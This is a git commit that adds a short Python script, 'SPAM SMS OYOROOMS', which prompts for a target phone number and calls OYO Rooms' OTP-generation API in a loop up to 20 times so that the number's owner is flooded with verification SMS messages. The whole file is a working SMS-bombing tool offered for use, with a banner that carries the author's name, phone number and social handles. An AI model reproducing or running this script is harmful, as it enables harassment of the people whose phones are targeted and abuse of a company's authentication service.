43a05d06863e2617affc8731c1c89671ae70bb09
Mr4LD1 <52981134+Mr4LD1@users.noreply.github.com>
2019-07-17 13:18:46 +0700

    Add files via upload

---
+++ oyo.py
@@ -0,0 +1,36 @@
+import requests, os
+
+os.system('clear')
+c=('\033[1;36m')
+r=('\033[1;31m')
+g=('\033[1;32m')
+w=('\033[1;37m')
+print("""%s
+			 SPAM SMS OYOROOMS%s
+ ,_     _‚
+ |\\\___//|	%sAuthor: Mr.4LD1%s
+ |=6   6=|	%sContact: 082231589330%s
+ \=._Y_.=/	%sGithub: https://github.com/Mr4LD1%s
+  )  `  (    ,	%sFB:M Aldi Triprasetya%s
+ /       \  ((
+ |       |   ))
+/| |   | |\_//	%sSPECIAL THANKS TO: GOD%s
+\| |._.| |/-`
+ '"'   '"'
+"""%(c,r,g,r,g,r,g,r,g,r,w,r))
+i=int(0)
+no=input("%sMasukan No Target => %s"%(g,w))
+while True:
+	idk=('status')
+	r=requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+no+'&country_code=+62')
+	if str(idk) in str(r.text):
+		print("[+] SUKSES")
+	else:
+		print("[-] GAGAL")
+		print("%s[!] GANTI TARGET, UDAH LIMIT COK DJANCOK"%(r))
+		break
+	i+=1
+	if i == 20:
+		print("%s[!] LIMIT SUDAH TERCAPAI COBA LAGI BESOK:)"%(r))
+		break
+
